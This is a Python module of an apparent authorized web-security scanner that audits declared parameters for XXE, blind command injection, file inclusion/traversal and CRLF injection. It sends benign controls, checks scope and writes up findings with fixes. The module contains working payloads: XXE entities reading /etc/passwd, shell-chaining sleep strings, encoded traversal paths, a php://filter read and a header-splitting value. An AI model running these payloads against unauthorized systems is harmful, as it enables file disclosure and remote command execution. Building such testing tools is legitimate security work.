"""Injection depth audit: XXE (with out-of-band), blind command injection, LFI/traversal, CRLF.

Parameters are never guessed. The operator declares each injectable input in
``auth_json['test_hints']['injection']['targets']`` as ``{url, method?, param, kind?}``;
a target with no ``kind`` is attacked with every class. Each attack sends a benign
control through the same endpoint and parameter, so a candidate always carries the
response that proves the difference, a quote that exists verbatim in the captured
evidence blob, and a proof request the verifier can replay.
"""
import base64
import json
import re
import statistics
import threading
import time
import uuid
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import quote as pct

from .checks import _candidate

INJECTION_OWASP = "A03:2021 Injection"
SLEEP_SECONDS = 5
MIN_DELAY = 4.0        # absolute floor: a 0.01s baseline must not shrink the proof
DELAY_FACTOR = 4.0     # and the delay must dwarf the baseline, not the other way round
KINDS = ("xxe", "command", "lfi", "traversal", "crlf")
PASSWD_LINE = re.compile(r"(?m)^[A-Za-z_][\w.-]*:[^:\r\n]*:\d+:\d+:")
B64_BLOB = re.compile(r"[A-Za-z0-9+/]{80,}={0,2}")

_clock = time.monotonic  # tests replace this; the evidence blob keeps the probe's duration


def _timing_proven(baseline_median: float, first: float, second: float) -> bool:
    """Repeatable blind delay: both runs over the absolute floor and over 4x the baseline."""
    floor = max(MIN_DELAY, DELAY_FACTOR * baseline_median)
    return first >= floor and second >= floor


def _lfi_payloads(php: bool) -> list[tuple[str, str]]:
    """(wire value, benign control value) pairs: the encodings beyond the existing check."""
    return [
        ("../../../../etc/passwd", "etc/passwd"),
        ("..%2f..%2f..%2f..%2fetc/passwd", "etc/passwd"),
        ("..%252f..%252f..%252f..%252fetc/passwd", "etc/passwd"),
        ("%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd", "etc/passwd"),
        ("....//....//....//....//etc/passwd", "etc/passwd"),
        ("%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd", "etc/passwd"),
        ("../../../../etc/passwd.", "etc/passwd"),
        ("../../../../etc/passwd%20", "etc/passwd"),
    ] + ([("php://filter/convert.base64-encode/resource=index.php", "index.php")] if php else [])


def _lfi_quote(body: str) -> str | None:
    """File content in the response: a passwd line, or a base64 blob decoding to PHP."""
    line = PASSWD_LINE.search(body or "")
    if line:
        return line.group(0)
    for blob in B64_BLOB.findall(body or ""):
        try:
            decoded = base64.b64decode(blob).decode(errors="replace")
        except ValueError:
            continue
        if "<?php" in decoded:
            return blob
    return None


def _quote_in_blob(quote: str, quote_in: str, blob_text: str) -> bool:
    """Is the quote a fact recorded in this evidence blob?

    A header quote is rebuilt from the blob's captured response headers, so a
    canary that only appears in the request cannot satisfy it.
    """
    if quote_in == "duration_ms":
        # the measurement lives in the recorded duration, not in the body text
        try:
            return "duration_ms" in json.loads(blob_text)
        except (ValueError, KeyError, TypeError):
            return False
    if quote_in == "header_fact":
        try:
            headers = json.loads(blob_text)["response"]["headers"]
        except (ValueError, KeyError, TypeError):
            return False
        want = quote.lower()
        return any(want in f"{k}: {v}".lower() for k, v in (headers or {}).items())
    return quote in blob_text


class _OOB:
    """Loopback listener for XXE parameter-entity callbacks. Binds; never dials."""

    def __init__(self):
        self.hits: list[dict] = []
        hits = self.hits

        class Handler(BaseHTTPRequestHandler):
            def do_GET(self):
                hits.append({"path": self.path,
                             "from": f"{self.client_address[0]}:{self.client_address[1]}"})
                body = b'<!ENTITY oob SYSTEM "file:///etc/passwd">'
                self.send_response(200)
                self.send_header("Content-Type", "application/xml-dtd")
                self.send_header("Content-Length", str(len(body)))
                self.end_headers()
                self.wfile.write(body)

            def log_message(self, *a):
                pass

        # the task allows this one local listener for out-of-band callbacks; it is
        # loopback-only and nothing in Libella ever requests it
        self.server = ThreadingHTTPServer(("127.0.0.1", 0), Handler)
        threading.Thread(target=self.server.serve_forever, daemon=True).start()

    def close(self):
        self.server.shutdown()
        self.server.server_close()


def _spec(raw) -> tuple[dict | None, str]:
    if not isinstance(raw, dict):
        return None, f"invalid injection target (not an object): {raw!r}"
    url, param = raw.get("url"), raw.get("param")
    if not isinstance(url, str) or not url.startswith(("http://", "https://")):
        return None, f"injection target has no http(s) url: {raw!r}"
    if not isinstance(param, str) or not param:
        return None, f"injection target {url} names no parameter (parameters are never guessed)"
    method = str(raw.get("method") or "GET").upper()
    if method not in ("GET", "POST", "PUT", "PATCH"):
        return None, f"injection target {url}: method {method} not supported"
    kind = raw.get("kind")
    if kind and kind not in KINDS:
        return None, f"injection target {url}: unknown kind {kind!r} (one of {list(KINDS)})"
    return {"url": url, "param": param, "method": method,
            "kinds": (kind,) if kind else ("xxe", "command", "lfi", "crlf"),
            "content_type": str(raw.get("content_type") or "")}, ""


def audit_injection(db, evidence, probe, scope, engagement_id: str, auth_json: dict,
                    pipeline, intent_id: str | None = None) -> dict:
    """Attack the declared injectable parameters; report only what a control proves."""
    out = {"status": "limited", "candidates": [], "observations": [],
           "limitations": [], "errors": []}
    hints = ((auth_json or {}).get("test_hints") or {}).get("injection") or {}
    targets = hints.get("targets") or []

    def limit(summary: str):
        out["limitations"].append(summary)
        pipeline.record_observation(engagement_id, intent_id, "injection_limitation", summary)

    def observe(summary: str, evidence_id: str | None = None, quote: str | None = None):
        out["observations"].append(summary)
        pipeline.record_observation(engagement_id, intent_id, "injection_observation",
                                    summary, evidence_id=evidence_id, quote=quote)

    def submit(cand: dict, extra_ev: tuple = ()) -> bool:
        blob = evidence.read(cand["evidence_ids"][0]).decode(errors="replace")
        if not cand.get("quote") or not _quote_in_blob(cand["quote"], cand.get("quote_in", "body"),
                                                       blob):
            observe(f"{cand['title']}: quote is not in the captured evidence; not submitted")
            return False
        cand["evidence_ids"] += [e for e in extra_ev if e]
        res = pipeline.submit_candidate(engagement_id, cand, intent_id)
        out["candidates"].append({"finding_id": res["id"], "title": cand["title"],
                                  "cwe": cand["cwe"], "endpoint": cand["endpoint"],
                                  "deduped": res["deduped"]})
        return True

    if not targets:
        limit("no injectable parameter declared (test_hints.injection.targets); "
              "no parameter was guessed and no request was sent")
        return out

    oob: _OOB | None = None

    def call(spec: dict, value: str, tool: str):
        """One request with the declared parameter replaced: (result, url, sent body)."""
        if spec["param"] == "body":
            ctype = spec["content_type"] or "application/xml"
            r = probe.request(engagement_id, scope, spec["url"], method=spec["method"],
                              headers={"Content-Type": ctype}, body=value, category="web",
                              intent_id=intent_id, tool=tool, follow_redirects=False)
            return r, spec["url"], value
        if spec["method"] == "GET":
            sep = "&" if "?" in spec["url"] else "?"
            url = f"{spec['url']}{sep}{spec['param']}={value}"
            r = probe.request(engagement_id, scope, url, method="GET", category="web",
                              intent_id=intent_id, tool=tool, follow_redirects=False)
            return r, url, None
        body = json.dumps({spec["param"]: value})
        r = probe.request(engagement_id, scope, spec["url"], method=spec["method"],
                          headers={"Content-Type": "application/json"}, body=body,
                          category="web", intent_id=intent_id, tool=tool,
                          follow_redirects=False)
        return r, spec["url"], body

    def timed(spec: dict, value: str, tool: str):
        started = _clock()
        r, url, body = call(spec, value, tool)
        return r, url, body, _clock() - started

    def proof(spec: dict, url: str, body: str | None) -> dict:
        pr = {"method": spec["method"], "url": url}
        if body is not None:
            raw = spec["param"] == "body"
            pr["headers"] = {"Content-Type": (spec["content_type"] or "application/xml")
                             if raw else "application/json"}
            pr["body"] = body
        return pr

    def attack_xxe(spec: dict):
        nonlocal oob
        control, _, _ = call(spec, "<r>ok</r>", "injection_xxe_control")
        if not control.get("ok"):
            limit(f"XXE control at {spec['url']} failed: {control.get('error')}; nothing was proven")
            return
        doc = '<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><r>&xxe;</r>'
        r, url, body = call(spec, doc, "injection_xxe")
        line = PASSWD_LINE.search(r.get("body") or "") if r.get("ok") else None
        if line:
            submit(_candidate(
                "XXE: external entity resolved to a local file", "CWE-611", INJECTION_OWASP,
                "high", "high", spec["url"],
                f"The XML parser behind parameter '{spec['param']}' resolves SYSTEM entities: a "
                f"document referencing file:///etc/passwd returned the file contents.",
                "Any local file the service can read (keys, config, /etc/shadow) is disclosed; "
                "a parameter entity can also reach internal services.",
                "Disable DOCTYPE/entity resolution in the parser and reject documents that "
                "declare entities.",
                r["evidence_id"], line.group(0), proof(spec, url, body),
                f"injection:xxe:{spec['url']}:{spec['param']}"),
                extra_ev=(control.get("evidence_id"),))
        else:
            observe(f"XXE file read not proven at {spec['url']} parameter '{spec['param']}'")

        if oob is None:
            oob = _OOB()
        path = f"/oob/{uuid.uuid4().hex[:12]}"
        doc = (f'<!DOCTYPE r [<!ENTITY % remote SYSTEM "http://127.0.0.1:{oob.server.server_port}'
               f'{path}">%remote;]><r>&oob;</r>')
        r2, url2, body2 = call(spec, doc, "injection_xxe_oob")
        hit = next((h for h in oob.hits if h["path"] == path), None)
        if hit is None:
            observe(f"XXE parameter entity at {spec['url']} did not reach the out-of-band listener")
            return
        ev = evidence.put_json(engagement_id, {"hits": list(oob.hits)}, "oob_hit")
        submit(_candidate(
            "XXE: parameter entity fetched an out-of-band resource", "CWE-611", INJECTION_OWASP,
            "high", "high", spec["url"],
            f"The parser behind parameter '{spec['param']}' fetched a parameter entity from "
            f"an out-of-band listener the target had no other reason to contact "
            f"({hit['from']} requested {hit['path']}).",
            "Confirms entity resolution even when nothing is echoed: internal services and "
            "local files can be reached and exfiltrated through entity URLs.",
            "Disable external entity resolution in the parser; never fetch a schema or "
            "entity over the network.",
            ev["id"], hit["path"], proof(spec, url2, body2),
            f"injection:xxe-oob:{spec['url']}:{spec['param']}"),
            extra_ev=(r2.get("evidence_id"),))

    def attack_command(spec: dict):
        b1, burl, bbody, d1 = timed(spec, "127.0.0.1", "injection_cmd_control")
        b2, _, _, d2 = timed(spec, "127.0.0.1", "injection_cmd_control")
        if not (b1.get("ok") and b2.get("ok")):
            limit(f"command-injection baselines at {spec['url']} failed: "
                  f"{b1.get('error') or b2.get('error')}; nothing was proven")
            return
        baseline = statistics.median([d1, d2])
        variants = [f"127.0.0.1;sleep {SLEEP_SECONDS}",
                    f"127.0.0.1|sleep {SLEEP_SECONDS}",
                    f"127.0.0.1`sleep {SLEEP_SECONDS}`",
                    f"127.0.0.1$(sleep {SLEEP_SECONDS})"]
        server = {k.lower(): str(v) for k, v in (b1.get("headers") or {}).items()}.get("server", "")
        if "win" in server.lower():  # only on an IIS/Windows target: a ping that really waits
            variants.append(f"127.0.0.1& ping -n {SLEEP_SECONDS} 127.0.0.1")
        for variant in variants:
            r1, url1, body1, first = timed(spec, variant, "injection_cmd_probe")
            if not r1.get("ok") or first < max(MIN_DELAY, DELAY_FACTOR * baseline):
                continue
            r2, _, _, second = timed(spec, variant, "injection_cmd_probe")
            if not r2.get("ok") or not _timing_proven(baseline, first, second):
                continue
            ms = json.loads(evidence.read(r1["evidence_id"]))["duration_ms"]
            summary = (f"delay {first:.2f}s vs baseline {baseline:.2f}s, reproduced at "
                       f"{second:.2f}s through parameter '{spec['param']}'")
            observe(f"command injection timing at {spec['url']}: {summary}",
                    r1.get("evidence_id"), summary)
            submit(_candidate(
                "OS command injection: blind time-based delay", "CWE-78", INJECTION_OWASP,
                "critical", "high", spec["url"],
                f"Parameter '{spec['param']}' reaches a shell: '{variant}' delayed the response "
                f"{first:.2f}s against a {baseline:.2f}s baseline, and {second:.2f}s when "
                f"repeated.",
                "Arbitrary command execution with the service account's privileges.",
                "Never build a command string from input: use an argument list, and validate "
                "the value against an allowlist.",
                # a timing claim is not a string in a body: quote the measurement and let
                # the verifier replay BOTH the payload and the benign control and compare
                r1["evidence_id"], f'"duration_ms": {ms}', proof(spec, url1, body1),
                f"injection:command:{spec['url']}:{spec['param']}",
                # a delay can be load: the benign value is the control the verifier replays
                proof={"signal": "timing", "benign_request": proof(spec, burl, bbody)}),
                extra_ev=(b1.get("evidence_id"),))
            return
        observe(f"no time-based command injection at {spec['url']} parameter "
                f"'{spec['param']}': baseline {baseline:.2f}s, no payload reached the threshold")

    def attack_lfi(spec: dict, kind: str):
        php = spec["url"].lower().endswith(".php")
        payloads = _lfi_payloads(php)
        control, _, _ = call(spec, payloads[0][1], f"injection_{kind}_control")
        if not control.get("ok"):
            limit(f"{kind} control at {spec['url']} failed: {control.get('error')}")
            return
        if _lfi_quote(control.get("body") or ""):
            limit(f"{kind} control at {spec['url']} already returns file content; "
                  "the parameter is not injectable through this path")
            return
        if not php:
            headers = {k.lower(): str(v) for k, v in (control.get("headers") or {}).items()}
            php = "php" in (headers.get("server", "") + headers.get("x-powered-by", "")).lower()
            payloads = _lfi_payloads(php)
        for wire, _ in payloads:
            r, url, body = call(spec, wire, f"injection_{kind}")
            if not r.get("ok"):
                continue
            quote = _lfi_quote(r.get("body") or "")
            if not quote:
                continue
            submit(_candidate(
                f"{'LFI' if kind == 'lfi' else 'Path traversal'}: parameter reads an "
                "arbitrary file", "CWE-22", INJECTION_OWASP, "high", "high", spec["url"],
                f"Parameter '{spec['param']}' with value '{wire}' returned file content that "
                f"the benign control ('{payloads[0][1]}') did not: the path is joined without "
                "normalisation.",
                "Any file the service can read is disclosed, including configuration, source "
                "and credentials.",
                "Resolve the requested name against a fixed base directory, reject anything "
                "that escapes it, and serve from an allowlist.",
                r["evidence_id"], quote, proof(spec, url, body),
                f"injection:{kind}:{spec['url']}:{spec['param']}"),
                extra_ev=(control.get("evidence_id"),))
            return
        observe(f"{kind} not proven at {spec['url']} parameter '{spec['param']}': "
                f"{len(payloads)} encodings returned no file content")

    def attack_crlf(spec: dict):
        control, _, _ = call(spec, "libella-benign", "injection_crlf_control")
        if not control.get("ok"):
            limit(f"CRLF control at {spec['url']} failed: {control.get('error')}")
            return
        value = "a\r\nset-cookie:***\r\nlibella-canary:1"
        wire = value if spec["param"] == "body" else pct(value, safe="")
        r, url, body = call(spec, wire, "injection_crlf")
        if not r.get("ok"):
            limit(f"CRLF probe at {spec['url']} failed: {r.get('error')}")
            return
        headers = {k.lower(): str(v) for k, v in (r.get("headers") or {}).items()}
        if "libella-canary" not in headers:
            observe(f"CRLF not proven at {spec['url']} parameter '{spec['param']}': "
                    "no injected header in the response")
            return
        # a header named libella-canary is only produced by the injected CRLF: the
        # benign control value cannot reach a header name
        quote, quote_in = f"libella-canary: {headers['libella-canary']}", "header_fact"
        submit(_candidate(
            "CRLF injection: response header injected from a parameter", "CWE-113",
            INJECTION_OWASP, "medium", "high", spec["url"],
            f"Parameter '{spec['param']}' written into a response header verbatim: a "
            f"percent-encoded CRLF inserted a 'libella-canary' header that no benign value "
            f"produces.",
            "Header splitting enables response splitting, cache poisoning and arbitrary "
            "cookie injection.",
            "Reject CR/LF in every value that reaches a header; use a framework setter that "
            "encodes them.",
            r["evidence_id"], quote, proof(spec, url, body),
            f"injection:crlf:{spec['url']}:{spec['param']}", quote_in=quote_in),
            extra_ev=(control.get("evidence_id"),))

    attackers = {"xxe": attack_xxe, "command": attack_command,
                 "lfi": lambda spec: attack_lfi(spec, "lfi"),
                 "traversal": lambda spec: attack_lfi(spec, "traversal"),
                 "crlf": attack_crlf}
    attacked = 0
    try:
        for raw in targets:
            spec, why = _spec(raw)
            if spec is None:
                limit(why)
                continue
            decision = scope.check_url(spec["url"], "web")
            if not decision.allowed:
                limit(f"{spec['url']} is out of scope ({decision.reason}); "
                      f"parameter '{spec['param']}' was not attacked")
                continue
            attacked += 1
            for kind in spec["kinds"]:
                try:
                    attackers[kind](spec)
                except Exception as exc:  # one class failing must not abort the others
                    out["errors"].append(f"{kind} {spec['url']} {spec['param']}: "
                                         f"{type(exc).__name__}: {exc}")
    finally:
        if oob is not None:
            oob.close()

    out["status"] = "completed" if attacked else "limited"
    db.emit(engagement_id, "injection_audit_complete",
            {"targets": attacked, "candidates": len(out["candidates"]),
             "limitations": len(out["limitations"]), "errors": len(out["errors"])})
    return out
